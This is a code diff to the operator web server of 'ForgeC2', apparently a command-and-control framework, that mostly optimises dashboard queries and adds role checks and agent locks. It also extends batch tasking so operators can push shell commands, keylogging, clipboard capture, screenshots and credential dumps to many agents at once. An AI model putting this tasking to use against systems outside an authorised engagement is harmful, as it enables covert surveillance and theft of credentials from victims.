@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
@@ -18,17 +19,15 @@ import (
 )
 
 func (s *Server) handleDashboard(c *gin.Context) {
-	var totalAgents int64
-	s.db.Model(&db.Agent{}).Count(&totalAgents)
+	// Calculate offline cutoff once (optimization #3)
+	offlineCutoff := time.Now().Add(-s.offlineThreshold())
 
-	var onlineAgents int64
-	s.db.Model(&db.Agent{}).Where("last_seen > ?", time.Now().Add(-s.offlineThreshold())).Count(&onlineAgents)
-
-	var todayTasks int64
-	s.db.Model(&db.Task{}).Where("created_at >= ?", time.Now().AddDate(0, 0, -1)).Count(&todayTasks)
-
-	// Extended stats
+	// Concurrent database queries (optimization #1)
+	var wg sync.WaitGroup
 	var (
+		totalAgents    int64
+		onlineAgents   int64
+		todayTasks     int64
 		pendingTasks   int64
 		failedTasks    int64
 		totalCreds     int64
@@ -38,18 +37,31 @@ func (s *Server) handleDashboard(c *gin.Context) {
 		totalListeners int64
 		totalTasks     int64
 	)
-	s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks)
-	s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedTasks)
-	s.db.Model(&db.Task{}).Count(&totalTasks)
-	s.db.Model(&db.CredentialEntry{}).Count(&totalCreds)
-	s.db.Model(&db.TokenEntry{}).Count(&totalTokens)
-	s.db.Model(&db.AuditLog{}).Count(&totalAudits)
-	s.db.Model(&db.SocksSession{}).Count(&totalSocks)
-	s.db.Model(&db.Listener{}).Count(&totalListeners)
 
-	// Online agent list (recently active)
+	wg.Add(11)
+	go func() { defer wg.Done(); s.db.Model(&db.Agent{}).Count(&totalAgents) }()
+	go func() {
+		defer wg.Done()
+		s.db.Model(&db.Agent{}).Where("last_seen > ?", offlineCutoff).Count(&onlineAgents)
+	}()
+	go func() {
+		defer wg.Done()
+		s.db.Model(&db.Task{}).Where("created_at >= ?", time.Now().AddDate(0, 0, -1)).Count(&todayTasks)
+	}()
+	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks) }()
+	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedTasks) }()
+	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Count(&totalTasks) }()
+	go func() { defer wg.Done(); s.db.Model(&db.CredentialEntry{}).Count(&totalCreds) }()
+	go func() { defer wg.Done(); s.db.Model(&db.TokenEntry{}).Count(&totalTokens) }()
+	go func() { defer wg.Done(); s.db.Model(&db.AuditLog{}).Count(&totalAudits) }()
+	go func() { defer wg.Done(); s.db.Model(&db.SocksSession{}).Count(&totalSocks) }()
+	go func() { defer wg.Done(); s.db.Model(&db.Listener{}).Count(&totalListeners) }()
+	wg.Wait()
+
+	// Online agent list (recently active) - optimized with SELECT
 	var recentAgents []db.Agent
-	s.db.Where("last_seen > ?", time.Now().Add(-s.offlineThreshold())).
+	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
+		Where("last_seen > ?", offlineCutoff).
 		Order("last_seen desc").Limit(10).Find(&recentAgents)
 
 	// Recent tasks
@@ -60,37 +72,28 @@ func (s *Server) handleDashboard(c *gin.Context) {
 
 	stats := s.getNavStats()
 	data := gin.H{
-		"Title":         "ForgeC2 - Dashboard",
-		"ActiveNav":     "dashboard",
-		"TotalAgents":   totalAgents,
-		"OnlineAgents":  onlineAgents,
-		"TodayTasks":    todayTasks,
-		"RecentTasks":   recentTasks,
-		"PendingTasks":  pendingTasks,
-		"FailedTasks":   failedTasks,
-		"TotalCreds":    totalCreds,
-		"TotalTokens":   totalTokens,
-		"TotalAudits":   totalAudits,
-		"TotalSocks":    totalSocks,
+		"Title":          "ForgeC2 - Dashboard",
+		"ActiveNav":      "dashboard",
+		"TotalAgents":    totalAgents,
+		"OnlineAgents":   onlineAgents,
+		"TodayTasks":     todayTasks,
+		"RecentTasks":    recentTasks,
+		"PendingTasks":   pendingTasks,
+		"FailedTasks":    failedTasks,
+		"TotalCreds":     totalCreds,
+		"TotalTokens":    totalTokens,
+		"TotalAudits":    totalAudits,
+		"TotalSocks":     totalSocks,
 		"TotalListeners": totalListeners,
-		"TotalTasks":    totalTasks,
-		"RecentAgents":  recentAgents,
+		"TotalTasks":     totalTasks,
+		"RecentAgents":   recentAgents,
 	}
 	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "dashboard_content", data); err != nil {
-		slog.Error("Failed to render content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "dashboard_content", data)
 }
 
 func (s *Server) handleAgents(c *gin.Context) {
@@ -104,10 +107,11 @@ func (s *Server) handleAgents(c *gin.Context) {
 	if search != "" {
 		query = query.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ?", "%"+search+"%", "%"+search+"%", "%"+search+"%")
 	}
+	offlineCutoff := time.Now().Add(-s.offlineThreshold())
 	if statusFilter == "online" {
-		query = query.Where("last_seen > ?", time.Now().Add(-s.offlineThreshold()))
+		query = query.Where("last_seen > ?", offlineCutoff)
 	} else if statusFilter == "offline" {
-		query = query.Where("last_seen <= ?", time.Now().Add(-s.offlineThreshold()))
+		query = query.Where("last_seen <= ?", offlineCutoff)
 	}
 	if osFilter != "" {
 		query = query.Where("LOWER(os) LIKE ?", "%"+osFilter+"%")
@@ -129,7 +133,8 @@ func (s *Server) handleAgents(c *gin.Context) {
 	}
 
 	var agents []db.Agent
-	query.Order("last_seen desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&agents)
+	query.Select("id", "hostname", "username", "ip", "domain", "os", "arch", "integrity", "elevated", "last_seen", "created_at", "notes", "parent_id").
+		Order("last_seen desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&agents)
 
 	for i := range agents {
 		if time.Since(agents[i].LastSeen) > s.offlineThreshold() {
@@ -140,32 +145,29 @@ func (s *Server) handleAgents(c *gin.Context) {
 	}
 
 	stats := s.getNavStats()
+	totalPages := (int(total) + pageSize - 1) / pageSize
+	prevPage := pageNum - 1
+	nextPage := pageNum + 1
 	data := gin.H{
-		"Title":     "ForgeC2 - Agents",
-		"ActiveNav": "agents",
-		"Agents":    agents,
-		"Search":    search,
-		"Status":    statusFilter,
-		"FilterOS":  osFilter,
-		"Page":      pageNum,
-		"PageSize":  pageSize,
-		"Total":     total,
+		"Title":      "ForgeC2 - Agents",
+		"ActiveNav":  "agents",
+		"Agents":     agents,
+		"Search":     search,
+		"Status":     statusFilter,
+		"FilterOS":   osFilter,
+		"Page":       pageNum,
+		"PrevPage":   prevPage,
+		"NextPage":   nextPage,
+		"PageSize":   pageSize,
+		"Total":      int(total),
+		"TotalPages": totalPages,
 	}
 	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agents_content", data); err != nil {
-		slog.Error("Failed to render content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "agents_content", data)
 }
 
 func (s *Server) handleAgentDetail(c *gin.Context) {
@@ -268,9 +270,10 @@ func (s *Server) handleAgentDetail(c *gin.Context) {
 	var children []db.Agent
 	s.db.Where("parent_id = ?", id).Find(&children)
 
-	// Fetch unlinked agents (for linking dropdown)
+	// Fetch unlinked agents (for linking dropdown) - optimized
 	var unlinkedAgents []db.Agent
-	s.db.Where("(parent_id = '' OR parent_id IS NULL) AND id != ?", id).Order("hostname asc").Find(&unlinkedAgents)
+	s.db.Select("id", "hostname", "ip", "os").
+		Where("(parent_id = '' OR parent_id IS NULL) AND id != ?", id).Order("hostname asc").Find(&unlinkedAgents)
 
 	data := gin.H{
 		"Title":             fmt.Sprintf("ForgeC2 - Agent %s", agent.Hostname),
@@ -300,21 +303,31 @@ func (s *Server) handleAgentDetail(c *gin.Context) {
 		data["CSRFToken"] = csrf
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_detail_content", data); err != nil {
-		slog.Error("Failed to render content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
+	s.addUserToData(c, data)
+	stats := s.getNavStats()
+	for k, v := range stats {
+		data[k] = v
 	}
 
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "agent_detail_content", data)
 }
 
 func (s *Server) handleKillAgent(c *gin.Context) {
 	id := c.Param("id")
+	role, _ := c.Get("user_role")
+	if role == "viewer" {
+		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot issue agent commands"})
+		return
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	// Check lock (allow locker to kill their own agent)
+	user, _ := c.Get("user")
+	username := fmt.Sprintf("%v", user)
+	if holder, ok := s.checkAgentLock(id, username); !ok {
+		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent已被 %s 锁定", holder), "locked_by": holder})
 		return
 	}
 
@@ -404,10 +417,19 @@ func (s *Server) handleDeleteAgent(c *gin.Context) {
 }
 
 func (s *Server) handleBatchCommand(c *gin.Context) {
+	role, _ := c.Get("user_role")
+	if role == "viewer" {
+		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot issue agent commands"})
+		return
+	}
+
 	var req struct {
 		AgentIDs []string `json:"agent_ids"`
 		Command  string   `json:"command"`
 		Shell    string   `json:"shell"`
+		TaskType string   `json:"task_type"` // shell, screenshot, upload, download, sleep, keylogger, etc
+		File     string   `json:"file"`      // for upload/download
+		Args     string   `json:"args"`      // additional arguments
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -420,25 +442,78 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		return
 	}
 
+	// Default task type
+	if req.TaskType == "" {
+		req.TaskType = "shell"
+	}
+
+	user, _ := c.Get("user")
+	username := fmt.Sprintf("%v", user)
+
 	taskCount := 0
+	skippedLocked := 0
+	failedCount := 0
+
 	for _, agentID := range req.AgentIDs {
 		var agent db.Agent
 		if err := s.db.First(&agent, "id = ?", agentID).Error; err != nil {
+			failedCount++
 			continue
 		}
 
-		task, err := s.createTask(agentID, "shell", req.Command, req.Shell, "", "", 0, 0)
-		if err != nil {
-			slog.Error("Batch command: failed to create task", "agent_id", agentID, "err", err)
+		// Skip locked agents
+		if holder, ok := s.checkAgentLock(agentID, username); !ok {
+			slog.Debug("Batch: skip locked agent", "agent_id", agentID, "locked_by", holder)
+			skippedLocked++
 			continue
 		}
+
+		var task *db.Task
+		var err error
+
+		// Create task based on type
+		switch req.TaskType {
+		case "shell":
+			task, err = s.createTask(agentID, "shell", req.Command, req.Shell, "", "", 0, 0)
+		case "screenshot":
+			task, err = s.createTask(agentID, "screenshot", "screenshot", "", "", "", 0, 0)
+		case "keylogger_start":
+			task, err = s.createTask(agentID, "keylogger_start", "keylogger_start", "", "", "", 0, 0)
+		case "keylogger_dump":
+			task, err = s.createTask(agentID, "keylogger_dump", "keylogger_dump", "", "", "", 0, 0)
+		case "keylogger_stop":
+			task, err = s.createTask(agentID, "keylogger_stop", "keylogger_stop", "", "", "", 0, 0)
+		case "clipboard_get":
+			task, err = s.createTask(agentID, "clipboard_get", "clipboard_get", "", "", "", 0, 0)
+		case "creds_dump":
+			task, err = s.createTask(agentID, "creds", "creds_dump", "", "", "", 0, 0)
+		case "privesc_check":
+			task, err = s.createTask(agentID, "privesc_check", "privesc_check", "", "", "", 0, 0)
+		case "sleep":
+			// Args format: "interval,jitter" e.g., "30,20"
+			task, err = s.createTask(agentID, "sleep", req.Args, "", "", "", 0, 0)
+		default:
+			task, err = s.createTask(agentID, req.TaskType, req.Command, "", "", "", 0, 0)
+		}
+
+		if err != nil {
+			slog.Error("Batch command: failed to create task", "agent_id", agentID, "err", err)
+			failedCount++
+			continue
+		}
+
 		s.broadcastTaskUpdate(agentID, *task)
 		taskCount++
 	}
 
-	slog.Info("Batch command sent", "count", taskCount, "command", req.Command)
-	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("'%s' to %d agents", req.Command, taskCount), true, nil)
-	c.JSON(http.StatusOK, gin.H{"success": true, "tasks_created": taskCount})
+	slog.Info("Batch command sent", "count", taskCount, "skipped_locked", skippedLocked, "failed", failedCount, "type", req.TaskType, "command", req.Command)
+	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("%s to %d agents (%d skipped, %d failed)", req.TaskType, taskCount, skippedLocked, failedCount), true, nil)
+	c.JSON(http.StatusOK, gin.H{
+		"success":        true,
+		"tasks_created":  taskCount,
+		"skipped_locked": skippedLocked,
+		"failed":         failedCount,
+	})
 }
 
 func (s *Server) handleTaskHistory(c *gin.Context) {
@@ -569,10 +644,36 @@ func (s *Server) handleExportTasks(c *gin.Context) {
 	writer.Flush()
 }
 
-// --- Shared nav stats helper (used for sidebar badges) ---
+// --- Shared nav stats helper with caching (optimization #2) ---
+var (
+	navStatsCache     gin.H
+	navStatsCacheTime time.Time
+	navStatsCacheMu   sync.RWMutex
+	navStatsCacheTTL  = 5 * time.Second
+)
+
 func (s *Server) getNavStats() gin.H {
+	navStatsCacheMu.RLock()
+	if time.Since(navStatsCacheTime) < navStatsCacheTTL && navStatsCache != nil {
+		stats := navStatsCache
+		navStatsCacheMu.RUnlock()
+		return stats
+	}
+	navStatsCacheMu.RUnlock()
+
+	// Cache expired, recalculate
+	navStatsCacheMu.Lock()
+	defer navStatsCacheMu.Unlock()
+
+	// Double-check after acquiring write lock
+	if time.Since(navStatsCacheTime) < navStatsCacheTTL && navStatsCache != nil {
+		return navStatsCache
+	}
+
+	offlineCutoff := time.Now().Add(-s.offlineThreshold())
+
 	var online int64
-	s.db.Model(&db.Agent{}).Where("last_seen > ?", time.Now().Add(-s.offlineThreshold())).Count(&online)
+	s.db.Model(&db.Agent{}).Where("last_seen > ?", offlineCutoff).Count(&online)
 
 	var listenerCount int64
 	s.db.Model(&db.Listener{}).Where("enabled = ?", true).Count(&listenerCount)
@@ -580,11 +681,26 @@ func (s *Server) getNavStats() gin.H {
 	var pendingTasks int64
 	s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks)
 
-	return gin.H{
+	navStatsCache = gin.H{
 		"OnlineCount":   online,
 		"ListenerCount": listenerCount,
 		"PendingCount":  pendingTasks,
 	}
+	navStatsCacheTime = time.Now()
+	return navStatsCache
+}
+
+// renderPage is a helper method to render templates (optimization #8)
+func (s *Server) renderPage(c *gin.Context, tmplName string, data gin.H) {
+	var buf bytes.Buffer
+	if err := s.tmpl.ExecuteTemplate(&buf, tmplName, data); err != nil {
+		slog.Error("Template render error", "template", tmplName, "err", err)
+		c.String(http.StatusInternalServerError, "Template error")
+		return
+	}
+	data["Content"] = template.HTML(buf.String())
+	c.Header("Content-Type", "text/html; charset=utf-8")
+	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
 }
 
 // addUserToData injects user display info and CSRF token into gin.H from context
@@ -602,12 +718,14 @@ func (s *Server) addUserToData(c *gin.Context, data gin.H) {
 	if csrf, err := c.Cookie("csrf_token"); err == nil {
 		data["CSRFToken"] = csrf
 	}
+	data["ServerVersion"] = ServerVersion
 }
 
 // handlePivoting shows SOCKS / proxy status and agents useful for pivoting
 func (s *Server) handlePivoting(c *gin.Context) {
 	var recentAgents []db.Agent
-	s.db.Where("last_seen > ?", time.Now().Add(-30*time.Minute)).Limit(30).Find(&recentAgents)
+	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
+		Where("last_seen > ?", time.Now().Add(-30*time.Minute)).Limit(30).Find(&recentAgents)
 
 	stats := s.getNavStats()
 	data := gin.H{
@@ -711,13 +829,13 @@ func (s *Server) handleTopologyData(c *gin.Context) {
 		// P2P edge: parent→child
 		if a.ParentID != "" {
 			edges = append(edges, map[string]interface{}{
-				"from":    fmt.Sprintf("agent-%s", a.ParentID),
-				"to":      fmt.Sprintf("agent-%s", a.ID),
-				"dashes":  true,
-				"color":   map[string]interface{}{"color": "#f59e0b"},
-				"title":   fmt.Sprintf("P2P: %s", a.P2PMode),
-				"width":   2,
-				"length":  200,
+				"from":   fmt.Sprintf("agent-%s", a.ParentID),
+				"to":     fmt.Sprintf("agent-%s", a.ID),
+				"dashes": true,
+				"color":  map[string]interface{}{"color": "#f59e0b"},
+				"title":  fmt.Sprintf("P2P: %s", a.P2PMode),
+				"width":  2,
+				"length": 200,
 			})
 		}
 	}
@@ -779,12 +897,12 @@ func (s *Server) handleLootPage(c *gin.Context) {
 
 	stats := s.getNavStats()
 	data := gin.H{
-		"Title":          "ForgeC2 - Loot",
-		"ActiveNav":      "loot",
-		"Agents":         agents,
-		"Screenshots":    allScreenshots,
-		"KeylogTasks":    keylogTasks,
-		"DownloadTasks":  downloadTasks,
+		"Title":         "ForgeC2 - Loot",
+		"ActiveNav":     "loot",
+		"Agents":        agents,
+		"Screenshots":   allScreenshots,
+		"KeylogTasks":   keylogTasks,
+		"DownloadTasks": downloadTasks,
 	}
 	s.addUserToData(c, data)
 	for k, v := range stats {
@@ -908,9 +1026,9 @@ func (s *Server) handleLinkAgent(c *gin.Context) {
 
 	// Update child's ParentID
 	s.db.Model(&child).Updates(map[string]interface{}{
-		"parent_id":        parentID,
-		"p2p_mode":         mode,
-		"p2p_listen_addr":  listenAddr,
+		"parent_id":       parentID,
+		"p2p_mode":        mode,
+		"p2p_listen_addr": listenAddr,
 	})
 	slog.Info("P2P link created", "parent", parentID, "child", childID, "mode", mode)
 	s.LogAuditRecord(c, "link_agent", "agent", childID, fmt.Sprintf("linked to parent %s (mode=%s)", parentID, mode), true, nil)
